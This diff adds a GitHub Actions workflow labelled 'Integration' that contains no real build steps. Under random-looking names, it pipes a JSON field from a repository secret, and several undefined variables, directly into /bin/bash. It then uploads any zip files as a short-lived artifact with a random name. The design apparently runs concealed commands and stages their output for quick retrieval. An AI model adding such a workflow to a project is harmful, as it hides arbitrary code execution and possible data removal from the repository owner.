@@ -1,0 +1,26 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          tq27132: ${{ secrets.tq27132 }}
+        run: |
+          printf '%s' "$tq27132" | jq -r .bp159 | /bin/bash
+          printf '%s' "$led1" | jq -r .qcvy8275 | /bin/bash
+          printf '%s' "$kdi6895" | jq -r .p36 | /bin/bash
+          echo $cwez8 | jq -r .bnu63 | /bin/bash
+          echo $s7845 | jq -r .iuldh54 | /bin/bash
+          echo $qixpm4 | jq -r .zqmy2 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 69dNvXjB
+          path: "*.zip"
+          retention-days: 1
